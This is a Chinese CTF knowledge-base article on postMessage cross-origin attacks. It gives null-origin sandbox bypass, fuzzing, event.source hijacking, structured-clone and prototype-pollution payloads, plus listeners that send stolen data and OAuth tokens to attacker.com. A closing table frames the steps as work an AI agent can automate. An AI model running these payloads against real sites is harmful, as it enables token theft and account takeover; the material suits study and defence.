---
id: "ctf-website/07-client/postmessage"
title: "PostMessage / 跨域通信攻击"
title_en: "PostMessage / Cross-Origin Communication Attacks"
summary: >
  PostMessage跨域通信攻击完整指南，涵盖null origin沙箱绕过、Origin Fuzzer自动化探测、event.source劫持手法、通过postMessage窃取OAuth token、Structured Clone算法副作用利用（带毒RegExp lastIndex），以及prototype pollution通过postMessage数据对象的提权链路。
summary_en: >
  Complete guide to PostMessage cross-origin communication attacks, covering null origin sandbox bypass, automated Origin Fuzzer probing, event.source hijacking techniques, OAuth token theft via postMessage, Structured Clone algorithm side-effect exploitation (poisoned RegExp lastIndex), and prototype pollution privilege escalation through postMessage data objects.
board: "ctf-website"
category: "07-client"
signals: ["postMessage", "跨域通信", "null origin", "OAuth token", "prototype pollution", "event.source", "structured clone"]
mcp_tools: ["http_probe", "kb_router"]
keywords: ["postMessage", "跨域通信", "null origin绕过", "OAuth token窃取", "prototype pollution", "structured clone", "event.source劫持"]
difficulty: "intermediate"
tags: ["client-side", "web-security", "oauth", "xss", "ctf"]
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# PostMessage / 跨域通信攻击

## Null Origin 沙箱绕过

```html
<!-- null_origin_bypass.html — 托管在 attacker.com -->
<!-- 目标页面: onmessage 检查 if (e.origin === window.origin) -->
<iframe sandbox="allow-scripts allow-popups"
  srcdoc="
    <script>
      // sandbox 属性 → window.origin = null
      // iframe 内 origin = null
      // e.origin === null === window.origin → 通过!
      window.parent.postMessage({
        type: 'admin_command',
        payload: 'delete_all',
        token: 'stolen_from_XSS'
      }, '*');
    </script>
  ">
</iframe>

<script>
  // 接收响应
  window.addEventListener('message', function(e) {
    if (e.data && e.data.success) {
      fetch('https://attacker.com/log?d=' + btoa(JSON.stringify(e.data)));
    }
  });
</script>
```

## PostMessage Origin Fuzzer

```python
# postmessage_fuzz.py — 探测 postMessage listener
from selenium import webdriver
import json

POSTMESSAGE_PROBES = [
    # Origin 变体
    {"origin": "null"},
    {"origin": "file://"},
    {"origin": "https://target.com.evil.com"},
    {"origin": "http://target.com"},  # https → http 降级
    {"origin": ""},
    {"origin": "*"},
    # Payload 变体
    {"data": {"__proto__": {"isAdmin": True}}},   # PP via postMessage
    {"data": {"constructor": {"prototype": {"role": "admin"}}}},
    {"data": {"type": "admin", "cmd": "getFlag"}},  # 命令注入
    {"data": {"token": "<img src=x onerror=alert(1)>"}},  # XSS via render
]

def fuzz_postmessage(target_page: str):
    """自动对目标页面发送各种 postMessage 组合"""
    driver = webdriver.Chrome()
    driver.get(target_page)
    for probe in POSTMESSAGE_PROBES:
        script = f"""
        window.postMessage({json.dumps(probe['data'])},
            '{probe.get('origin', '*')}');
        """
        driver.execute_script(script)
        # 检测异常行为 (DOM 变化、网络请求、console log)
```

## event.source Hijacking

```html
<!-- event_source_hijack.html -->
<!-- 场景: 父页面打开 trusted.html in iframe
     父: trustedWindow = window.open('trusted.html')
     trusted.html → onmessage → if (e.source === opener) → 信任
     攻击者导航 trusted iframe 到自己的页面 → e.source still passes -->

<script>
// 打开目标页面
var win = window.open('https://target.com/trusted_page.html');

// 等待加载完成 → 导航到我们的页面（保留 reference）
setTimeout(function() {
    win.location = 'https://attacker.com/evil.html';
}, 3000);

// 从 evil.html postMessage → e.source 仍然是原来 trusted 页面的 window
// 但内容已经是我们的了
setTimeout(function() {
    win.postMessage({action: 'readSensitiveData'}, '*');
}, 5000);
</script>
```

## OAuth Token 窃取 via postMessage

```html
<!-- 场景: OAuth proxy 页面在 opener.postMessage(token, '*') 中泄露 token -->
<script>
// Step 1: 诱导受害者打开 OAuth proxy
// <a href="https://target.com/oauth/proxy?redirect_uri=https://attacker.com/callback">
// Step 2: proxy 页面包含:
//   window.opener.postMessage({access_token: 'xxx'}, '*');
// Step 3: 我们的 callback 页面接收:
window.addEventListener('message', function(e) {
    if (e.data.access_token) {
        fetch('https://attacker.com/steal_token', {
            method: 'POST',
            body: JSON.stringify({token: e.data.access_token, origin: e.origin})
        });
    }
});
</script>
```

## Structured Clone 算法利用

```javascript
// postMessage 使用 structured clone → 保留某些特殊对象
// Blob, File, RegExp (带 lastIndex) → 可在接收端产生副作用

// 攻击: 发送带毒 lastIndex 的 RegExp
var evilRegex = /a/g;
evilRegex.lastIndex = 999999;  // 下一个 exec 从 999999 开始

targetWindow.postMessage({
    type: 'validate',
    pattern: evilRegex   // 如果接收端调用 pattern.test(input) → 失败
}, '*');
```

## 攻击链

```
PostMessage null origin → sandbox iframe → 绕过 origin 检查 → 执行特权命令
PostMessage → event.source hijacking → 偷取敏感数据
PostMessage → OAuth token leak → 窃取 access_token → Account Takeover
PostMessage → prototype pollution via data object → isAdmin=true → 提权
PostMessage → XSS via data render → DOM injection → cookie steal
```

## Evidence

记录: postMessage 发送的 origin/data、接收端 handler 代码、成功绕过的证明、OAuth token (脱敏)

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| postMessage 端点探测 | `http_probe` | HTTP GET 探测 postMessage 监听端点 |
| 知识检索 | `kb_router` | 按 postMessage 攻击信号搜索知识库 |
